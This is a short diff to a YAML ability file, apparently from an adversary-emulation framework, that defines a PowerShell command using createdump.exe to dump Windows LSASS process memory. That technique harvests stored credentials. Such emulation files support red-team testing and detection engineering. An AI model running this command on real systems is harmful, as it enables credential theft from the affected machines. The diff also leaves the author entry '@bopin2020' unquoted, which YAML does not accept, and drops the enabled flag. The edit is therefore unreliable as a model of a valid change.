@@ -8,11 +8,11 @@ technique:
 platforms:
   windows:
     psh:
-      command: 'Invoke-Command -ScriptBlock {C:\Program` Files\dotnet\shared\Microsoft.NETCore.App\5.0.3\createdump.exe -u -f lsass.dmp (Get-Process lsass).id}'
+      command: |
+        Invoke-Command -ScriptBlock {C:\Program` Files\dotnet\shared\Microsoft.NETCore.App\5.0.3\createdump.exe -u -f lsass.dmp (Get-Process lsass).id}
 metadata:
   authors:
     - bfuzzy1
-    - '@bopin2020'
+    - @bopin2020
   tags: []
   version: 1
-  enabled: true
